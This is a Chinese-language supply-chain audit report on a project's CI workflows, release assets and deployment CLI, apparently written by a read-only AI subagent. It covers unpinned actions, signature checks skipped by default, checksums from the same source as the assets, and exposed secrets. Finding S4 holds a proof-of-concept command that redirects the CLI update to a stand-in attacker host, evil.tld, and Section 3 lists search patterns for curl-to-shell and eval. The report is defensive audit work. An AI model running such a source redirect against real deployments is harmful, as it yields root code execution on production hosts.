# 面 8 — root / scripts / CI 供应链审计报告

> 审计面：root / scripts / CI 供应链 ｜ 类型：**I 新面审计**（此前未系统审过）
> 派发：2026-09-29 08:4x ｜ 返回：2026-09-29 08:5x ｜ 审计员：subagent（只读）
> 复核：**未经独立复核**（按 L1 口径，下列结论为单方证据）

## 1. Findings

| id | 严重度 | 位置 | 最小 PoC / 触发路径 | 影响面 | 与既有结论关系 |
|---|---|---|---|---|---|
| **S1** | **High**（影响面 Critical） | `release.yml:88,128,199,202,205,239,263,273,379,385`、`.github/actions/e2e-domain/action.yml:24`、`e2e.yml:393`、`lint-workflows.yml:47` | 174 处 `uses:` 中 **SHA 固定 = 0**（`rg 'uses:[^\n]*@[0-9a-f]{40}' .github/ \| wc -l` → `0`）。上游 tag 被 force-push/失陷即在本流水线执行任意代码；`release.yml` 全局 `packages: write / id-token: write / attestations: write / actions: write`（:30-35），`publish-cli` 另加 job 级 `contents: write`（:85）。**`dtolnay/rust-toolchain@stable` 是分支引用**、`docker://rhysd/actionlint:1.7.7` 是 tag 非 digest | 可 push 恶意镜像到 GHCR、滥用 OIDC、`gh release upload --clobber` 覆盖 `noj-cli-linux-amd64(+.sha256)/compose/env` → **污染所有后续 install/update** | 新增。**且与仓库自述矛盾**：`dependabot.yml:14-16` 声称"生成的 PR 会用 SHA 钉形式（对应修复 S2）"，实际 0 处；`scripts/release/check-supply-chain.sh:117-127` 只钉 Trivy 版本字符串，**无任何 action SHA 门禁** |
| **S2** | **High** | `.env.prod.example:21-22`、`noj-cli/src/prod/config.ts:542-545`、`noj-docs/docs/operators/production-deploy.md:129` | 模板随 Release 发布（`release.yml:114-119` `cp .env.prod.example env.prod.example`）并被 `install` 落盘为 `.env.prod` → **默认 `NOJ_ENFORCE_IMAGE_SIGNATURES=false`，cosign 验签整体跳过**，仅打一行 warn 继续（fail-open） | `release.yml` 的 `cosign sign/attest` + `attest-build-provenance`（:294-306）默认**零校验价值**；GHCR 里 `noj-*:<NOJ_VERSION>` tag 被覆盖/入侵即直接运行；`verify` 命令同样放行 | 新增。与"镜像已签名"的既有印象冲突 |
| **S3** | Medium | `noj-cli/src/prod/bootstrap.ts:73,133-175,176-200`、`release.yml:303`、`production-deploy.md:46-48` | 校验链**无独立信任锚**：产物与其 `.sha256` 来自**同一 Release**，能改资产者可同时替换两者；`attest-build-provenance` 的 `subject-digest` **只覆盖镜像 digest**，不覆盖 CLI 二进制 / compose / env 资产；`--clobber`（:130）允许同 tag 覆盖资产且摘要同步被覆盖 | 下载→校验→落盘全程"自证"，仅靠 TLS；CLI 二进制/compose 被替换后无检测手段 | **核实 2026-09-27 修复**：资产名/点号前缀问题**确已修好且有回归测试**（见 §2）；但信任锚缺口未覆盖 |
| **S4** | Medium | `noj-cli/src/prod/cli.ts:468,580,583`、`release.ts:150-165`、`bootstrap.ts:76-88` | `NOJ_UPDATE_REPOSITORY`/`NOJ_UPDATE_API_URL` 可把 install/update 下载源指向任意主机（只要求 `https://`、**无 host 白名单**）。PoC：`NOJ_UPDATE_API_URL=https://evil.tld/rel.json ./noj-cli update --dir /opt/neuro-oj` → 从攻击者 Release 取 compose/env（内容即 root 下的 `docker compose` 定义 → 等同 root 代码执行） | 需前置：能设置部署进程环境/`.env.prod`（运维自身或降权的自动化账号） | 新增 |
| **S5** | Medium | `.github/actions/e2e-domain/action.yml:62,177`、`ci.yml:2022,2077`；全仓 `rg -- '--frozen\|--locked'` 仅命中 `noj-cli/deno.json:11` | CI 用裸 `deno install`，Cargo 无 `--locked`（`rg 'cargo .*--locked'` → 0）。PR 改写 `deno.lock`（integrity/版本映射）或 `Cargo.lock` 后 **CI 不会判定"锁文件失效"**，全绿通过 | AGENTS.md §8.1「禁止手动修改 deno.lock / Cargo.lock」**无机器门禁**；外部贡献者可经 PR 引入/篡改依赖而不触发任何锁一致性失败 | 新增（"lock 改动即失效"这一关切：**当前不失效**） |
| **S6** | Medium | `ci.yml:590,673,752,831,910,989,1068,1147,1226,1305,1384,1463,1542,1621,1700,1779,1958` | `JWT_SECRET: ${{ secrets.JWT_SECRET }}` 直接给到执行 PR 代码的 job（`deno task test`）。fork PR 拿不到（GitHub 不传 secret），但**任何具 write 权限的账号推分支开 PR 即可在测试阶段执行任意代码并外带该 secret**；job 无 `environment` 保护/无审批 | 需前置：write 权限（或被盗号） | 新增 |
| **S7** | Low | `release.yml:218` | `version="${{ github.event.release.tag_name \|\| github.ref_name }}"` **内联插值进 `run:`**（同文件 :128/:481 用 `env:` 传递，风格不一致）。触发需 write 权限且下游有 tag 正则校验 | 加固：workflow 内插值风格统一走 `env:` | 新增 |
| **S8** | Low | `.github/dependabot.yml:57-71`、`noj-ui/deno.json` | `package-ecosystem: npm` 指向 `/noj-ui`，但依赖声明在 `deno.json`，Dependabot 不解析 → **该条目不产生有效更新**；前端依赖事实上无自动更新 | 供应链可见性缺口：新 CVE 不会通过 PR 暴露 | 新增 |
| **S9** | Low（文档正确性，**需实测**） | `production-deploy.md:46-48` | `curl -fsSLO ".../releases/download/$VERSION/noj-cli-linux-amd64"` **缺 `-L`**；GitHub 资产端点 302 到 `objects.githubusercontent.com`，无 `-L` 时落盘的是重定向响应体 → 随后 `sha256sum -c` 失败（**fail-closed，不致害**，但文档命令按字面跑不通） | 首装体验 | 新增 |

补充（并入 S1/S3）：`publish-cli` 用 `gh release edit ... --latest`（`release.yml:486`）与 `--clobber` 上传，**同 tag 可重写资产**；正式镜像 tag 有 digest 不可变校验（:314-332），**资产侧没有等价不可变性**。

## 2. Release 资产校验链逐环节核对

| 环节 | 位置 | 现状 | 缺口 |
|---|---|---|---|
| ① 资产生成 | `release.yml:94-101`、`:114-127` | ✅ 4 个资产 + 各自 `.sha256`，格式一致，且有点号前缀兜底自检 | — |
| ② 资产名契约回归 | `noj-cli/src/prod/bootstrap_test.ts:474-503`（**行锚定**匹配 `gh release upload` 清单）、`release_test.ts:97`（断言不用 `/releases/latest`） | ✅ **2026-09-27 的 404 修复完整且被测试钉住**（含名称改写成因与 #431 就绪窗口） | — |
| ③ 人工首装下载 | `production-deploy.md:46-50` | ✅ 明确 `sha256sum -c` | ❌ 校验文件同源（S3）；❌ `curl` 缺 `-L`（S9，需实测） |
| ④ install/update 自动下载 | `bootstrap.ts:133-175` `downloadVerified` | ✅ 先取资产、再取 `.sha256`、正则 `^[a-fA-F0-9]{64}$`、小写化比对（`SHA256_RE:73`）；用 `fetch` 而非 `curl`，**无 shell 拼接** | ❌ 两文件同源 = 无独立锚（S3）；❌ 源可被 env 重定向（S4） |
| ⑤ 落盘 | `bootstrap.ts:176-200` | ✅ **两阶段提交**（`.tmp` → 校验全通过 → `.bak` + rename → 失败回滚 + `finally` 清理）；`overwrite` 默认 **false** | — |
| ⑥ 使用（部署） | `lifecycle.ts:591-616` | ✅ **先 `verify-images` 再 `compose-pull`**（顺序正确）；`backup → pull`（:1490-1543 备份失败即中止，早于任何 compose 变更） | ❌ 默认跳过验签（S2）；❌ **验签得到的 digest 未回填到 pull 的镜像引用**（compose 按 tag pull）→ 验签与拉取之间存在 tag 被移动的 TOCTOU 窗口；❌ `update` **不校验/不替换 CLI 自身二进制**（设计如此，由用户手动下载并 `sha256sum -c`） |

## 3. 已审但未发现问题的子面（附检索证据）

| 子面 | 检索词 | 命中 |
|---|---|---|
| `pull_request_target` / `workflow_run` / `issue_comment` / `repository_dispatch` | `rg 'pull_request_target\|workflow_run\|issue_comment\|repository_dispatch' .github/` | **0** → 无"PR 目标工作流泄密"这一类面 |
| PR 标题/正文/分支名进入 `run:` | `rg 'pull_request\.(title\|body)' .github/`、逐条核对 `${{ github.event/head_ref/ref_name }}` | **0**；`github.head_ref` 仅用于 docker 缓存 scope 字符串（非 shell）；`run:` 内插值只有自家 steps/needs 输出与 S7 一处 |
| `eval` / `curl \| bash` / 脚本注入 | `rg '\beval[ (]' .github/ scripts/`、`rg 'curl[^|]*\|[[:space:]]*(ba\|z\|da)?sh'` | **0 / 0**；CLI 全程 `Deno.Command` 参数数组，`sh -c` 仅用于**位置参数**传路径 |
| `continue-on-error` 是否掩盖失败 | 逐条核对 21 处 | **全部**是失败日志/artifact/SBOM 上传步骤，**无测试或门禁被吞** |
| 权限最小化 | `rg -A3 '^permissions:'` | `ci`/`e2e`/`lint-workflows` = `contents: read`；只有 `release.yml` 放宽（与攻击面一致） |
| 锁文件在版本控制内 + 缓存 key | `rg --files -g 'deno.lock' -g 'Cargo.lock'` | 各模块 lock 均在仓库；CI 缓存 key 绑定 lock 内容 hash → 无"按旧 hash 命中脏缓存"面 |
| 部署链 fail-closed（**开赛前关切**） | `lifecycle.ts`/`bootstrap.ts`/`deprecation-gate.sh`/`data_restore.ts` | install 先验后拉；bootstrap 两阶段+回滚；update **备份失败即中止且先于任何 compose 变更**；deprecated 脚本非 TTY 明确报错；restore/drill 共用同一恢复序列且需 `--confirm`。**除 S2 外未发现会破坏既有数据的 fail-open 路径** |
| 2026-09-19 结论复核（单一安装路径） | `rg 'scripts/deploy/install\.sh\|setup\.sh'` | 仅剩注释/文档引用与 E2E 的 `scripts/e2e/setup.sh`；单一安装路径成立 |
| **本轮新增改动复核**（A5/B3） | `gate-list.ts:78-81`、`setup.sh:20`、`teardown.sh:17`、`check-setup.sh:60`；`silent-skip-report.ts:275-302` | ① ✅ 已入 `REPO_GATES` 且闸门强制 `COMPOSE_PROJECT_NAME` 存在；② ✅ `--check` 先读盘比对、仅非 `--check` 落盘 —— **两项均正确**（独立确认） |
| 供应链门禁自身的测试 | `scripts/release/test-supply-chain.sh` | ✅ 有正例 + 逐项负例（含 Trivy 版本回归）；但**覆盖面窄**（见 S1） |

## 4. 最值得优先修的 3 条

1. **S1 — 全量 action SHA 固定 + 把门禁做真**：`release.yml` 是唯一同时持有 `packages/id-token/attestations/contents: write` 的 workflow，也是唯一能污染"镜像 + Release 资产 + 每次安装"的通道；而且现在**有虚假安全感**（dependabot 注释宣称已 SHA 钉、`check-supply-chain.sh` 只检察 Trivy）。修法：全部 `uses:` 钉 40 位 SHA（含 `dtolnay/rust-toolchain@stable`、`docker://rhysd/actionlint`），在 `check-supply-chain.sh` 加"全 workflow `uses:` 非 SHA 即失败"并补反例测试；另加 `.github/CODEOWNERS` 守 `.github/**`、各 `deno.lock`、`noj-cli/**`（当前 **0 个 CODEOWNERS**）。
2. **S2 — `.env.prod.example` 默认开启验签**（改 `true`；cosign 缺失时明确报错并给出"确认降级"指引），文档同步；否则**开赛前默认部署完全不校验镜像**，release.yml 的签名/证明白做。顺带把验签得到的 digest 用于 pull（消 TOCTOU）。
3. **S3 — 给发布资产一个独立信任锚**：对 `noj-cli-linux-amd64` 与两个部署文件补 `cosign sign-blob` / `attest-build-provenance`（当前 `subject-digest` 只覆盖镜像），并在 CLI 与文档校验步骤中验证证明（`gh attestation verify`）。此举同时消解 S4 的"换源"价值。
4. 备选（低成本）：`deno install --frozen` / `cargo --locked` + 一条"lock 文件变更需 owner 评审"的机器门禁（S5）。

**需实测项（只读约束下无法验证）**：① 真实 Release 端到端资产链（须触发 `release.yml` 或访问 GitHub）；② S9 的 `curl -fsSLO` 302 行为；③ 现网 `/opt/neuro-oj/.env.prod` 中 `NOJ_ENFORCE_IMAGE_SIGNATURES` 的实际取值（`grep` 只读即可——决定 S2 是"潜在"还是"**已在生产生效**"）。

## 5. 本轮处置

**未修任何一条**——三条优先项分别属于：依赖版本钉定的机械化大改（S1，174 处）、**面向运维的默认策略变更**（S2，改错会导致部署硬失败，且 Owner 可能有意在 beta 期关闭验签）、发布流程与信任锚改造（S3，需改 release.yml + CLI + 文档三处契约）。按 spec §7「设计级变更 / 需改契约 → 记入待人工清单，不改」处理，全部交 Owner 裁决。
